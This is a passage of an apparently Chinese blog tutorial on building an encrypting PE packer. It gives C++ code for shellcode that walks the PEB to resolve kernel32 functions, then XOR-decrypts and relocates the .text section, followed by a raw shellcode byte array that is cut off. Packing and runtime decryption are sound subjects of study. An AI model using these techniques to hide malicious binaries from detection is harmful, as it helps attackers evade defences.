class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* VIRTUALPROTECT)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="function"><span class="params">PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将shellcode装到另一个节区中，不影响text节区的同时还方便找到对应代码。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> code_seg(<span class="meta-string">&quot;.SMC&quot;</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Myshellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获取PEB结构体的地址</span></span><br><span class="line">PPEB PebBaseAddress;</span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, dword ptr fs : [<span class="number">0x18</span>]</span><br><span class="line">mov eax, dword ptr ds : [eax + <span class="number">0x30</span>]</span><br><span class="line">mov PebBaseAddress, eax;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过PEB来找到kernel32的基地址</span></span><br><span class="line">PPEB_LDR_DATA pPebLdr = PebBaseAddress-&gt;Ldr;</span><br><span class="line">PLDR_DATA_TABLE_ENTRY pLdrDataHeader = (PLDR_DATA_TABLE_ENTRY)pPebLdr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink-&gt;Flink;</span><br><span class="line"><span class="comment">//wprintf(L&quot;%s\n&quot;, pLdrDataHeader-&gt;FullDllName.Buffer);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//偏移0x10的地址即为指向kernel.dll基址的指针</span></span><br><span class="line"><span class="comment">//printf(&quot;%x\n&quot;, *(pLdrDataHeader-&gt;Reserved2));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//测试是否一样</span></span><br><span class="line"><span class="comment">//HMODULE libhandle = LoadLibraryA(&quot;kernel32.dll&quot;);</span></span><br><span class="line"><span class="comment">//printf(&quot;%x &quot;, libhandle);</span></span><br><span class="line"></span><br><span class="line">PBYTE hkernel = *(PBYTE*)(pLdrDataHeader-&gt;Reserved2);</span><br><span class="line">PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)hkernel;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)(hkernel + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY PIED = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hkernel + pIOH-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"></span><br><span class="line">DWORD NumOfFunction = PIED-&gt;NumberOfFunctions;</span><br><span class="line">PIMAGE_IMPORT_BY_NAME FuctionName = <span class="literal">NULL</span>;</span><br><span class="line">GETPROCADDRESS MyGetProcAddress = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PIMAGE_THUNK_DATA RVAofNameArrays = (PIMAGE_THUNK_DATA)((DWORD)hkernel + PIED-&gt;AddressOfNames);</span><br><span class="line">PIMAGE_THUNK_DATA RVAofEotArrays = (PIMAGE_THUNK_DATA)((DWORD)hkernel + PIED-&gt;AddressOfFunctions);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过比较导出表的函数名称获取GetProcAddress的地址</span></span><br><span class="line">DWORD strName[<span class="number">3</span>] = &#123; <span class="number">0x50746547</span>,<span class="number">0x41636f72</span>,<span class="number">0x65726464</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NumOfFunction; i++)</span><br><span class="line">&#123;</span><br><span class="line">FuctionName = (PIMAGE_IMPORT_BY_NAME)((DWORD)hkernel + RVAofNameArrays[i].u1.AddressOfData);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strName[<span class="number">0</span>] == *(DWORD*)((DWORD)FuctionName) &amp;&amp; strName[<span class="number">1</span>] == *(DWORD*)((DWORD)FuctionName + <span class="number">4</span>) &amp;&amp; strName[<span class="number">2</span>] == *(DWORD*)((DWORD)FuctionName + <span class="number">8</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//这里有个+2的偏移，是通过查看本电脑的kernerl32.dll得到的，确实导出表的函数地址需要偏移2</span></span><br><span class="line">MyGetProcAddress = (GETPROCADDRESS)((DWORD)hkernel + RVAofEotArrays[i + <span class="number">2</span>].u1.AddressOfData);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//char GetModuleHandleAFunctionName[] = &#123; 0x47,0x65,0x74,0x4d,0x6f,0x64,0x75,0x6c,0x65,0x48,0x61,0x6e,0x64,0x6c,0x65,0x41,0x00 &#125;;</span></span><br><span class="line">DWORD GetModuleHandleAFunctionName[<span class="number">6</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">GetModuleHandleAFunctionName[<span class="number">0</span>] = <span class="number">0x4d746547</span>;</span><br><span class="line">GetModuleHandleAFunctionName[<span class="number">1</span>] = <span class="number">0x6c75646f</span>;</span><br><span class="line">GetModuleHandleAFunctionName[<span class="number">2</span>] = <span class="number">0x6e614865</span>;</span><br><span class="line">GetModuleHandleAFunctionName[<span class="number">3</span>] = <span class="number">0x41656c64</span>;</span><br><span class="line">GetModuleHandleAFunctionName[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取GetModuleHandleAFunction函数地址</span></span><br><span class="line">GETMODULEHANDLEA MyGetModuleHandleA = (GETMODULEHANDLEA)MyGetProcAddress((HMODULE)hkernel, (<span class="keyword">char</span>*)GetModuleHandleAFunctionName);</span><br><span class="line"></span><br><span class="line">PBYTE BaseAddress = (PBYTE)MyGetModuleHandleA(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER       pExeIDH = (PIMAGE_DOS_HEADER)BaseAddress;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER  pExeIOH = (PIMAGE_OPTIONAL_HEADER)(BaseAddress + pExeIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">PIMAGE_FILE_HEADER      pExeIFH = (PIMAGE_FILE_HEADER)(BaseAddress + pExeIDH-&gt;e_lfanew + <span class="number">4</span>);</span><br><span class="line">PIMAGE_SECTION_HEADER   pExeISH = (PIMAGE_SECTION_HEADER)(BaseAddress + pExeIDH-&gt;e_lfanew + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line"></span><br><span class="line">DWORD OldSectionNumber = pExeIFH-&gt;NumberOfSections - <span class="number">1</span>;</span><br><span class="line">DWORD dwTextsize;</span><br><span class="line">DWORD* pTextStart = <span class="literal">NULL</span>;</span><br><span class="line">DWORD TextMax = pExeISH-&gt;Misc.VirtualSize + pExeISH-&gt;VirtualAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">//寻找.text节区，获取其起始RVA和大小，解密会用到</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; OldSectionNumber; pExeISH++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((DWORD) * (DWORD*)pExeISH-&gt;Name == <span class="number">0x7865742e</span>)</span><br><span class="line">&#123;</span><br><span class="line">dwTextsize = pExeISH-&gt;Misc.VirtualSize;</span><br><span class="line">pTextStart = (DWORD*)(pExeISH-&gt;VirtualAddress + (DWORD)pExeIDH);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取VirtualProtectFunction地址，修改.text节区为可写可读可执行</span></span><br><span class="line"><span class="keyword">char</span> VirtualProtectFunctionName[<span class="number">15</span>] = &#123; <span class="number">0x56</span>,<span class="number">0x69</span>,<span class="number">0x72</span>,<span class="number">0x74</span>,<span class="number">0x75</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x50</span>,<span class="number">0x72</span>,<span class="number">0x6f</span>,<span class="number">0x74</span>,<span class="number">0x65</span>,<span class="number">0x63</span>,<span class="number">0x74</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">VIRTUALPROTECT MyVirtualProtect = (VIRTUALPROTECT)MyGetProcAddress((HMODULE)hkernel, VirtualProtectFunctionName);</span><br><span class="line"></span><br><span class="line">DWORD flOldProtect;</span><br><span class="line">MyVirtualProtect((LPVOID)pTextStart, dwTextsize, PAGE_EXECUTE_READWRITE, &amp;flOldProtect);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PIMAGE_BASE_RELOCATION  pExeIBR = (PIMAGE_BASE_RELOCATION)((DWORD)BaseAddress + pExeIOH-&gt;DataDirectory[<span class="number">5</span>].VirtualAddress);</span><br><span class="line">DWORD dwImageBase = *(DWORD*)(pExeIOH-&gt;ImageBase + pExeIOH-&gt;AddressOfEntryPoint + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">DWORD Round = <span class="literal">NULL</span>;</span><br><span class="line">Round = dwTextsize / <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pExeIOH-&gt;DataDirectory[<span class="number">5</span>].VirtualAddress == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//没有重定位表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Round; i++)</span><br><span class="line">&#123;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(pTextStart + i) = *(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(pTextStart + i) ^ <span class="number">0x12345678</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//将text节区还原为重定位表之前的情况。</span></span><br><span class="line"><span class="keyword">while</span> (pExeIBR-&gt;VirtualAddress != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">DWORD RvaofBlock = pExeIBR-&gt;VirtualAddress;</span><br><span class="line"><span class="comment">//定义成一个WORD的指针，方便取值计算</span></span><br><span class="line">WORD* RvaArrays = (WORD*)((DWORD)pExeIBR + <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"><span class="comment">//算出这个重定位表块需要修改多少个RAV</span></span><br><span class="line"><span class="keyword">int</span> NumofRva = (pExeIBR-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="keyword">sizeof</span>(WORD);</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改每个块中的重定位表信息</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NumofRva; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((RvaArrays[i] &amp; <span class="number">0xfff</span>) + RvaofBlock &gt; TextMax)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//32位程序一般Type就是3，也就是IMAGE_REL_BASED_HIGHLOW</span></span><br><span class="line">DWORD* pAddr = (DWORD*)((DWORD)BaseAddress + (RvaArrays[i] &amp; <span class="number">0xfff</span>) + RvaofBlock);</span><br><span class="line">*pAddr = *pAddr + dwImageBase - (DWORD)BaseAddress;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pExeIBR = (PIMAGE_BASE_RELOCATION)((DWORD)pExeIBR + pExeIBR-&gt;SizeOfBlock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解密</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Round; i++)</span><br><span class="line">&#123;</span><br><span class="line">*(DWORD*)(pTextStart + i) = *(DWORD*)(pTextStart + i) ^ <span class="number">0x12345678</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//再次进行重定位表。</span></span><br><span class="line">pExeIBR = (PIMAGE_BASE_RELOCATION)((DWORD)BaseAddress + pExeIOH-&gt;DataDirectory[<span class="number">5</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pExeIBR-&gt;VirtualAddress != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">DWORD RvaofBlock = pExeIBR-&gt;VirtualAddress;</span><br><span class="line"><span class="comment">//定义成一个WORD的指针，方便取值计算</span></span><br><span class="line">WORD* RvaArrays = (WORD*)((DWORD)pExeIBR + <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"><span class="comment">//算出这个重定位表块需要修改多少个RAV</span></span><br><span class="line"><span class="keyword">int</span> NumofRva = (pExeIBR-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="keyword">sizeof</span>(WORD);</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改每个块中的重定位表信息</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NumofRva; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((RvaArrays[i] &amp; <span class="number">0xfff</span>) + RvaofBlock &gt; TextMax)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//32位程序一般Type就是3，也就是IMAGE_REL_BASED_HIGHLOW</span></span><br><span class="line">DWORD* pAddr = (DWORD*)((DWORD)BaseAddress + (RvaArrays[i] &amp; <span class="number">0xfff</span>) + RvaofBlock);</span><br><span class="line">*pAddr = *pAddr - dwImageBase + (DWORD)BaseAddress;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pExeIBR = (PIMAGE_BASE_RELOCATION)((DWORD)pExeIBR + pExeIBR-&gt;SizeOfBlock);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> code_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/SECTION:.SMC,ERW&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//用来导出shellcode的，但是由于只有Debug模式下的才好修改，所以还是在ida里面提取shellcode吧。</span></span><br><span class="line">PBYTE Start, End;</span><br><span class="line">Start = (PBYTE)Myshellcode;</span><br><span class="line">End = (PBYTE)func2;</span><br><span class="line"><span class="keyword">int</span> lenth = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (; Start &lt; End; Start++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\\x%02x&quot;</span>, *Start);</span><br><span class="line">lenth++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n%x&quot;</span>, lenth);</span><br><span class="line">Myshellcode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编译好了后就是去ida里面删除栈检测了，以及提取出shellcode。</p><h3 id="ExeShell"><a href="#ExeShell" class="headerlink" title="ExeShell"></a>ExeShell</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;BlowFish.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;\x55\x8B\xEC\x81\xEC\xB8\x03\x00\x00\x53\x56\x57\x8D\xBD\x48\xFC\xFF\xFF\xB9\xEE\x00\x00\x00\xB8\xCC\xCC\xCC\xCC\xF3\xAB\x64\xA1\x18\x00\x00\x00\x3E\x8B\x40\x30\x89\x45\xF8\x8B\x45\xF8\x8B\x48\x0C\x89\x4D\xEC\x8B\x45\xEC\x8B\x48\x14\x8B\x11\x8B\x02\x89\x45\xE0\x8B\x45\xE0\x8B\x48\x10\x89\x4D\xD4\x8B\x45\xD4\x89\x45\xC8\x8B\x45\xC8\x8B\x48\x3C\x8B\x55\xD4\x8D\x44\x0A\x18\x89\x45\xBC\xB8\x08\x00\x00\x00\x6B\xC8\x00\x8B\x55\xBC\x8B\x45\xD4\x03\x44\x0A\x60\x89\x45\xB0\x8B\x45\xB0\x8B\x48\x14\x89\x4D\xA4\xC7\x45\x98\x00\x00\x00\x00\xC7\x45\x8C\x00\x00\x00\x00\x8B\x45\xB0\x8B\x4D\xD4\x03\x48\x20\x89\x4D\x80\x8B\x45\xB0\x8B\x4D\xD4\x03\x48\x1C\x89\x8D\x74\xFF\xFF\xFF\xC7\x85\x60\xFF\xFF\xFF\x47\x65\x74\x50\xC7\x85\x64\xFF\xFF\xFF\x72\x6F\x63\x41\xC7\x85\x68\xFF\xFF\xFF\x64\x64\x72\x65\xC7\x85\x54\xFF\xFF\xFF\x00\x00\x00\x00\xEB\x0F\x8B\x85\x54\xFF\xFF\xFF\x83\xC0\x01\x89\x85\x54\xFF\xFF\xFF\x8B\x85\x54\xFF\xFF\xFF\x3B\x45\xA4\x73\x72\x8B\x85\x54\xFF\xFF\xFF\x8B\x4D\x80\x8B\x55\xD4\x03\x14\x81\x89\x55\x98\xB8\x04\x00\x00\x00\x6B\xC8\x00\x8B\x55\x98\x8B\x84\x0D\x60\xFF\xFF\xFF\x3B\x02\x75\x45\xB8\x04\x00\x00\x00\xC1\xE0\x00\x8B\x4D\x98\x8B\x94\x05\x60\xFF\xFF\xFF\x3B\x51\x04\x75\x2E\xB8\x04\x00\x00\x00\xD1\xE0\x8B\x4D\x98\x8B\x94\x05\x60\xFF\xFF\xFF\x3B\x51\x08\x75\x18\x8B\x85\x54\xFF\xFF\xFF\x8B\x8D\x74\xFF\xFF\xFF\x8B\x55\xD4\x03\x54\x81\x08\x89\x55\x8C\xEB\x05\xE9\x74\xFF\xFF\xFF\x33\xC0\x89\x85\x34\xFF\xFF\xFF\x89\x85\x38\xFF\xFF\xFF\x89\x85\x3C\xFF\xFF\xFF\x89\x85\x40\xFF\xFF\xFF\x89\x85\x44\xFF\xFF\xFF\x89\x85\x48\xFF\xFF\xFF\xB8\x04\x00\x00\x00\x6B\xC8\x00\xC7\x84\x0D\x34\xFF\xFF\xFF\x47\x65\x74\x4D\xB8\x04\x00\x00\x00\xC1\xE0\x00\xC7\x84\x05\x34\xFF\xFF\xFF\x6F\x64\x75\x6C\xB8\x04\x00\x00\x00\xD1\xE0\xC7\x84\x05\x34\xFF\xFF\xFF\x65\x48\x61\x6E\xB8\x04\x00\x00\x00\x6B\xC8\x03\xC7\x84\x0D\x34\xFF\xFF\xFF\x64\x6C\x65\x41\xB8\x04\x00\x00\x00\xC1\xE0\x02\xC7\x84\x05\x34\xFF\xFF\xFF\x00\x00\x00\x00\x90\x90\x8D\x85\x34\xFF\xFF\xFF\x50\x8B\x4D\xD4\x51\xFF\x55\x8C\x90\x90\x90\x90\x90\x90\x90\x89\x85\x28\xFF\xFF\xFF\x90\x90\x6A\x00\xFF\x95\x28\xFF\xFF\xFF\x90\x90\x90\x90\x90\x90\x90\x89\x85\x1C\xFF\xFF\xFF\x8B\x85\x1C\xFF\xFF\xFF\x89\x85\x10\xFF\xFF\xFF\x8B\x85\x10\xFF\xFF\xFF\x8B\x48\x3C\x8B\x95\x1C\xFF\xFF\xFF\x8D\x44\x0A\x18\x89\x85\x04\xFF\xFF\xFF\x8B\x85\x10\xFF\xFF\xFF\x8B\x48\x3C\x8B\x95\x1C\xFF\xFF\xFF\x8D\x44\x0A\x04\x89\x85\xF8\xFE\xFF\xFF\x8B\x85\x10\xFF\xFF\xFF\x8B\x48\x3C\x8B\x95\x1C\xFF\xFF\xFF\x8D\x84\x0A\xF8\x00\x00\x00\x89\x85\xEC\xFE\xFF\xFF\x8B\x85\xF8\xFE\xFF\xFF\x0F\xB7\x48\x02\x83\xE9\x01\x89\x8D\xE0\xFE\xFF\xFF\xC7\x85\xC8\xFE\xFF\xFF\x00\x00\x00\x00\x8B\x85\xEC\xFE\xFF\xFF\x8B\x48\x08\x8B\x95\xEC\xFE\xFF\xFF\x03\x4A\x0C\x89\x8D\xBC\xFE\xFF\xFF\xC7\x85\xB0\xFE\xFF\xFF\x00\x00\x00\x00\xEB\x0F\x8B\x85\xEC\xFE\xFF\xFF\x83\xC0\x28\x89\x85\xEC\xFE\xFF\xFF\x8B\x85\xB0\xFE\xFF\xFF\x3B\x85\xE0\xFE\xFF\xFF\x73\x36\x8B\x85\xEC\xFE\xFF\xFF\x81\x38\x2E\x74\x65\x78\x75\x26\x8B\x85\xEC\xFE\xFF\xFF\x8B\x48\x08\x89\x8D\xD4\xFE\xFF\xFF\x8B\x85\xEC\xFE\xFF\xFF\x8B\x48\x0C\x03\x8D\x10\xFF\xFF\xFF\x89\x8D\xC8\xFE\xFF\xFF\xEB\x02\xEB\xAD\xC6\x85\x98\xFE\xFF\xFF\x56\xC6\x85\x99\xFE\xFF\xFF\x69\xC6\x85\x9A\xFE\xFF\xFF\x72\xC6\x85\x9B\xFE\xFF\xFF\x74\xC6\x85\x9C\xFE\xFF\xFF\x75\xC6\x85\x9D\xFE\xFF\xFF\x61\xC6\x85\x9E\xFE\xFF\xFF\x6C\xC6\x85\x9F\xFE\xFF\xFF\x50\xC6\x85\xA0\xFE\xFF\xFF\x72\xC6\x85\xA1\xFE\xFF\xFF\x6F\xC6\x85\xA2\xFE\xFF\xFF\x74\xC6\x85\xA3\xFE\xFF\xFF\x65\xC6\x85\xA4\xFE\xFF\xFF\x63\xC6\x85\xA5\xFE\xFF\xFF\x74\xC6\x85\xA6\xFE\xFF\xFF\x00\x90\x90\x8D\x85\x98\xFE\xFF\xFF\x50\x8B\x4D\xD4\x51\xFF\x55\x8C\x90\x90\x90\x90\x90\x90\x90\x89\x85\x8C\xFE\xFF\xFF\x90\x90\x8D\x85\x80\xFE\xFF\xFF\x50\x6A\x40\x8B\x8D\xD4\xFE\xFF\xFF\x51\x8B\x95\xC8\xFE\xFF\xFF\x52\xFF\x95\x8C\xFE\xFF\xFF\x90\x90\x90\x90\x90\x90\x90\xB8\x08\x00\x00\x00\x6B\xC8\x05\x8B\x95\x04\xFF\xFF\xFF\x8B\x85\x1C\xFF\xFF\xFF\x03\x44\x0A\x60\x89\x85\x74\xFE\xFF\xFF\x8B\x85\x04\xFF\xFF\xFF\x8B\x48\x1C\x8B\x95\x04\xFF\xFF\xFF\x8B\x42\x10\x8B\x4C\x01\x04\x89\x8D\x68\xFE\xFF\xFF\xC7\x85\x5C\xFE\xFF\xFF\x00\x00\x00\x00\x8B\x85\xD4\xFE\xFF\xFF\xC1\xE8\x02\x89\x85\x5C\xFE\xFF\xFF\xB8\x08\x00\x00\x00\x6B\xC8\x05\x8B\x95\x04\xFF\xFF\xFF\x83\x7C\x0A\x60\x00\x75\x54\xC7\x85\x50\xFE\xFF\xFF\x00\x00\x00\x00\xEB\x0F\x8B\x85\x50\xFE\xFF\xFF\x83\xC0\x01\x89\x85\x50\xFE\xFF\xFF\x8B\x85\x50\xFE\xFF\xFF\x3B\x